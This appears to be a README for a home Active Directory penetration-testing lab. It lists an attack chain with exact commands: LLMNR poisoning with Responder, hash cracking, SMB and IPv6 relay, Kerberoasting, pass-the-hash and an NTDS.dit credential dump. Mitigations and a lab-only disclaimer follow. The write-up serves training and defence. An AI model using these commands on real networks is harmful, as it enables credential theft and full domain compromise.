# Active Directory Penetration Testing Lab

## Overview
Simulated Active Directory penetration test demonstrating common attack techniques in a controlled lab environment.

## Lab Environment
- **Domain Controller:** Windows Server 2022
- **Workstations:** 2x Windows 10  
- **Attacker:** Kali Linux
- **Network:** 192.168.100.0/24

## Attack Chain

### 1. Initial Access

**LLMNR/MDNS Poisoning** — Responder lắng nghe và bắt NTLMv2 hash khi victim kết nối sai tên host.
```bash
sudo responder -I eth0 -dwv
```
![LLMNR Poisoning](Screenshots/01-llmnr-poisoning.png)

---

**Hash Cracking** — Dùng Hashcat với wordlist rockyou.txt để crack NTLMv2 hash thành plaintext.
```bash
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```
![Hash Cracked](Screenshots/02-hash-cracked.png)

---

**SMB Relay Attack** — Relay NTLM authentication sang máy khác để dump SAM hashes.
```bash
sudo ntlmrelayx.py -tf target_relay.txt -smb2support -i
```
![SMB Relay Setup](Screenshots/03-smb-relay-setup.png)
![SAM Hashes Dump](Screenshots/04-sam-hashes-dump.png)

---

### 2. Post-Exploitation / Lateral Movement

**IPv6 Attack (mitm6)** — Giả mạo DNS IPv6 để relay authentication lên LDAPS, tạo user mới với DCSync rights.
```bash
sudo mitm6 -d giahuy.local --ignore-nofqdn -i eth0
sudo ntlmrelayx.py -6 -t ldaps://192.168.100.131 -wh fakewpad.giahuy.local -l loot
```
![mitm6 Setup](Screenshots/05-ipv6-mitm6-setup.png)
![mitm6 Relay](Screenshots/06-ipv6-mitm6-relay.png)

---

### 3. Enumeration

**BloodHound** — Collect và visualize AD relationships, tìm attack path lên Domain Admin.
```bash
sudo bloodhound-python -d giahuy.local -u thanhthao -p 'Welcome1' -ns 192.168.100.131 -c all
```
![BloodHound Overview](Screenshots/07-bloodhound-overview.png)
![BloodHound Path to DA](Screenshots/08-bloodhound-path-to-da.png)

---

### 4. Privilege Escalation

**Kerberoasting** — Request TGS ticket cho service account rồi crack offline.
```bash
sudo GetUserSPNs.py giahuy.local/thanhthao:'Welcome1' -dc-ip 192.168.100.131 -request
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```
![Kerberoasting SPN](Screenshots/09-kerberoasting-spn.png)
![Kerberoasting Cracked](Screenshots/10-kerberoasting-cracked.png)

---

**Pass-the-Hash** — Dùng NTLM hash để authenticate không cần plaintext password, đạt SYSTEM shell.
```bash
smbexec.py Administrator@192.168.100.13 -hashes aad3b435b51404eeaad3b435b51404ee:<hash>
```
![Pass-the-Hash Shell](Screenshots/11-pass-the-hash-shell.png)

---

### 5. Domain Compromise

**NTDS.dit Dump** — Dump toàn bộ domain credentials từ Domain Controller.
```bash
secretsdump.py giahuy.local/Administrator@192.168.100.131 -hashes <hash>
```
![NTDS Dump](Screenshots/12-ntds-dump.png)

---

## Tools Used
- Kali Linux
- Responder
- Impacket (ntlmrelayx, smbexec, secretsdump)
- netexec
- BloodHound
- mitm6
- Hashcat

## Key Findings
| Vulnerability          | Severity |
|------------------------|----------|
| LLMNR Enabled          | High     |
| Weak Service Passwords | Critical |
| SMB Signing Disabled   | High     |
| IPv6 Not Disabled      | High     |

## Mitigations
- Disable LLMNR/NBT-NS
- Enable SMB signing
- Strong password policy
- Network segmentation

## Disclaimer
Educational purposes only. Performed in isolated lab environment.

## References
- [TCM Security - PEH](https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course)
- [MITRE ATT&CK](https://attack.mitre.org/)
